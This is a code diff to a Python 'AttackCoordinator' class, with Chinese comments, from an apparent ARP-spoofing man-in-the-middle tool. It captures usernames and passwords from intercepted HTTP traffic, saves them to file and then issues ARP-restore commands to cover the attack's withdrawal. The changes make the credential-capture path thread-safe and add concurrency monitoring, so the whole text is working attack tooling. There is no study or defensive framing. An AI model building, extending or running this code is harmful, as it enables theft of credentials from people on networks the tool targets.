@@ -299,47 +299,15 @@ class AttackCoordinator:
                 reason='high_value_event_detected'
             )
         
-        # ★【核心逻辑4】★ 凭据捕获处理（无论在哪种攻击模式下）
+        # ★【核心逻辑4】★ 凭据捕获处理已移到 process_high_value_event_atomic 方法
+        # ★【重要修改】★ 移除凭据处理逻辑，避免重复处理
         if analysis.http_credentials:
-            # ★【原子性增强】★ 先进行原子性凭据去重检查
-            username = analysis.http_credentials.get('username', '')
-            password = analysis.http_credentials.get('password', '')
-            credential_key = f"{target_ip}:{username}:{password}"
-            
-            # 快速原子性检查，避免重复处理
-            with self._global_credentials_lock:
-                if (credential_key in self._processed_credentials or 
-                    credential_key in self._processing_credentials or
-                    self.state_cache.has_credentials_saved(credential_key)):
-                    
-                    with self.stats_lock:
-                        self.stats['credentials_deduplicated'] += 1
-                    self.logger.debug(f"🚫 Credentials {credential_key} already handled, skipping HTTP processing")
-                    
-                    return AttackDecision(
-                        action='ignore',
-                        target_ip=target_ip,
-                        reason='credentials_already_processed'
-                    )
-            
-            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
-                           f"{username}:{password}")
-            
-            # 保存凭据到文件（内部有原子性保护）
-            self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
-            
-            # ★【分离管理5】★ 清理会话跟踪
-            self._cleanup_session_tracking(target_ip)
-            
-            # 标记攻击成功
-            self.state_cache.end_attack_session(target_ip, success=True)
-            
-            # 立即恢复网络
+            # 凭据处理已经在 process_high_value_event_atomic 中处理
+            # 这里只返回 ignore，避免重复决策
             return AttackDecision(
-                action='restore',
+                action='ignore',
                 target_ip=target_ip,
-                gateway_ip=self.config.network.gateway_ip,
-                reason='credentials_captured'
+                reason='credentials_handled_atomically'
             )
         
         # ★【核心逻辑5】★ 普通HTTP流量，记录但不做决策
@@ -579,49 +547,38 @@ class AttackCoordinator:
         
         return stats
     
-    def log_concurrency_status(self):
-        """★【新增】★ 记录并发状态，用于调试"""
-        with self._global_credentials_lock, self._arp_restore_lock, self._decision_lock:
-            session_stats = self.get_session_stats()
-            
-            self.logger.info(f"🔄 Concurrency Status - "
-                           f"Processing Credentials: {len(self._processing_credentials)}, "
-                           f"Processed Credentials: {len(self._processed_credentials)}, "
-                           f"Restoring Targets: {len(self._restoring_targets)}, "
-                           f"Processing Decisions: {len(self._processing_decisions)}, "
-                           f"Active Scouts: {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, "
-                           f"Active Attacks: {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
-    
-    def force_cleanup_all_locks(self):
-        """★【紧急方法】★ 强制清理所有锁状态，仅在调试或恢复时使用"""
-        self.logger.warning("🚨 Force cleaning all lock states - this should only be used for debugging!")
+    # ★【新增】★ 并发状态监控方法
+    def get_concurrency_stats(self) -> dict:
+        """获取并发处理状态统计"""
+        stats = {}
         
         with self._global_credentials_lock:
-            processing_count = len(self._processing_credentials)
-            processed_count = len(self._processed_credentials)
-            self._processing_credentials.clear()
-            self._processed_credentials.clear()
-            self.logger.warning(f"🧹 Force cleared {processing_count} processing + {processed_count} processed credentials")
+            stats.update({
+                'processing_credentials': len(self._processing_credentials),
+                'processed_credentials': len(self._processed_credentials),
+                'processing_items': list(self._processing_credentials) if len(self._processing_credentials) <= 5 else ['...too many to display...']
+            })
         
         with self._arp_restore_lock:
-            restoring_count = len(self._restoring_targets)
-            self._restoring_targets.clear()
-            self.logger.warning(f"🧹 Force cleared {restoring_count} restoring targets")
+            stats.update({
+                'restoring_targets': len(self._restoring_targets),
+                'restore_items': list(self._restoring_targets) if len(self._restoring_targets) <= 5 else ['...too many to display...']
+            })
+            
+        return stats
+    
+    def log_concurrency_status(self):
+        """记录并发状态到日志"""
+        stats = self.get_concurrency_stats()
+        self.logger.info(f"🔄 Concurrency Status - Processing Credentials: {stats['processing_credentials']}, Processed Credentials: {stats['processed_credentials']}, Restoring Targets: {stats['restoring_targets']}, Processing Decisions: {len(self._processing_decisions)}, Active Scouts: {len(self.active_scouts)}/{self.max_scout_attacks}, Active Attacks: {len(self.active_attacks)}/{self.max_active_attacks}")
         
-        with self._decision_lock:
-            decision_count = len(self._processing_decisions)
-            self._processing_decisions.clear()
-            self.logger.warning(f"🧹 Force cleared {decision_count} processing decisions")
-        
-        with self.active_scouts_lock:
-            scout_count = len(self.active_scouts)
-            self.active_scouts.clear()
-            self.logger.warning(f"🧹 Force cleared {scout_count} active scouts")
-        
-        with self.active_attacks_lock:
-            attack_count = len(self.active_attacks)
-            self.active_attacks.clear()
-            self.logger.warning(f"🧹 Force cleared {attack_count} active attacks")
+        # 如果有正在处理的项目，输出详细信息（便于调试）
+        if stats['processing_credentials'] > 0:
+            self.logger.debug(f"🔄 Currently Processing Credentials: {stats['processing_items']}")
+        if stats['restoring_targets'] > 0:
+            self.logger.debug(f"🔄 Currently Restoring: {stats['restore_items']}")
+
+    # ...existing code...
     
     def register_active_attack(self, target_ip: str, duration: int) -> bool:
         """★【新增】★ 注册活跃攻击，返回是否成功"""
@@ -662,3 +619,95 @@ class AttackCoordinator:
         """★【新增】★ 获取当前活跃攻击数量"""
         with self.active_attacks_lock:
             return len(self.active_attacks)
+    
+    # ★★★【关键修复】★★★ 原子化高价值事件处理方法
+    def process_high_value_event_atomic(self, analysis_result):
+        """
+        原子化处理高价值事件（如凭据捕获），确保只有一个线程能够成功处理
+        这是解决心跳超时问题的核心修复
+        """
+        if not hasattr(analysis_result, 'http_credentials') or not analysis_result.http_credentials:
+            return
+        
+        source_ip = analysis_result.source_ip
+        credentials = analysis_result.http_credentials
+        username = credentials.get('username', 'N/A')
+        password = credentials.get('password', 'N/A')
+        
+        # 生成凭据的唯一标识符
+        credential_key = f"{source_ip}:{username}:{password}"
+        
+        # ★★★【关键】★★★ 在整个决策过程中持有锁，防止竞争条件
+        with self._global_credentials_lock:
+            # 1. 检查是否已经被处理过
+            if credential_key in self._processed_credentials:
+                self.logger.debug(f"🚫 [ATOMIC] Credentials {credential_key} already processed, skipping")
+                return
+            
+            # 2. 检查是否正在被其他线程处理
+            if credential_key in self._processing_credentials:
+                self.logger.debug(f"🚫 [ATOMIC] Credentials {credential_key} currently being processed, skipping")
+                return
+            
+            # 3. 标记为正在处理，防止其他线程进入
+            self._processing_credentials.add(credential_key)
+            self.logger.info(f"🏆 [ATOMIC] First thread capturing credentials: {username}@{source_ip}")
+        
+        # 锁已释放，现在安全地执行后续操作
+        try:
+            # 4. 执行凭据保存（使用现有的原子方法）
+            self._save_credentials(source_ip, credentials, analysis_result.metadata or {})
+            
+            # 5. 触发立即ARP恢复
+            self._trigger_immediate_withdrawal_atomic(source_ip)
+            
+            # 6. 标记为已完全处理
+            with self._global_credentials_lock:
+                self._processed_credentials.add(credential_key)
+                self.logger.info(f"✅ [ATOMIC] Credentials processing completed: {username}@{source_ip}")
+        
+        except Exception as e:
+            self.logger.error(f"❌ [ATOMIC] Error processing credentials {credential_key}: {e}")
+        finally:
+            # 7. 确保清理处理标记
+            with self._global_credentials_lock:
+                self._processing_credentials.discard(credential_key)
+
+    def _trigger_immediate_withdrawal_atomic(self, target_ip: str):
+        """原子化触发ARP恢复，防止重复命令"""
+        
+        # ARP恢复命令级别的去重
+        with self._arp_restore_lock:
+            if target_ip in self._restoring_targets:
+                self.logger.debug(f"🚫 [ATOMIC] RESTORE_ARP for {target_ip} already issued recently")
+                return
+            
+            # 标记为正在恢复
+            self._restoring_targets.add(target_ip)
+            self.logger.info(f"⚡ [ATOMIC] Triggering immediate withdrawal for {target_ip}")
+        
+        try:
+            # 构造ARP恢复命令
+            restore_command = {
+                "type": "RESTORE_ARP",
+                "target_ip": target_ip,
+                "reason": "credentials_captured",
+                "priority": "immediate"
+            }
+            
+            # 发送命令
+            if self.command_sender:
+                self.command_sender(restore_command)
+                self.logger.info(f"🔧 [ATOMIC] RESTORE_ARP command sent for {target_ip}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [ATOMIC] Failed to trigger withdrawal for {target_ip}: {e}")
+        finally:
+            # 延迟清理恢复标记，避免过快重复
+            def cleanup_restore_mark():
+                time.sleep(5)  # 5秒后清理
+                with self._arp_restore_lock:
+                    self._restoring_targets.discard(target_ip)
+            
+            import threading
+            threading.Thread(target=cleanup_restore_mark, daemon=True).start()
